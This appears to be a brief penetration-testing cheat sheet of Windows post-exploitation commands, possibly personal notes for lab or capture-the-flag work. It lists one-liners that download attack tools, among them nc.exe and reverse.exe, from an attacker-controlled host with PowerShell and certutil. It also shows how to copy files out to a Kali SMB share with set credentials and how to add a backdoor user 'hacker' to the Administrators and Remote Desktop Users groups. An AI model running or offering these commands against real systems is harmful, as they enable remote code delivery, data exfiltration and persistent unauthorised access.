# Search dir and subdirs
```
dir /s <filename>
```

# Downloading on windows
```
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
iwr -uri http://lhost/file -Outfile file

certutil -urlcache -split -f "http://<LHOST>:8000/<FILE> <FILE>
certutil -urlcache -split -f "http://192.168.100.5:8000/nc.exe nc.exe

certutil -urlcache -split -f "http://192.168.100.5:8000/reverse.exe" reverse.exe
copy \\kali\share\file .
```

# Windows to Kali
```
kali> impacket-smbserver -smb2support <sharename> .
win> copy file \\KaliIP\sharename

impacket-smbserver -smb2support -username thm -password Passw0rd! test .
```

# Adding users
```
net user hacker hacker123 /add
net localgroup Administrators hacker /add
net localgroup "Remote Desktop Users" hacker /ADD
```

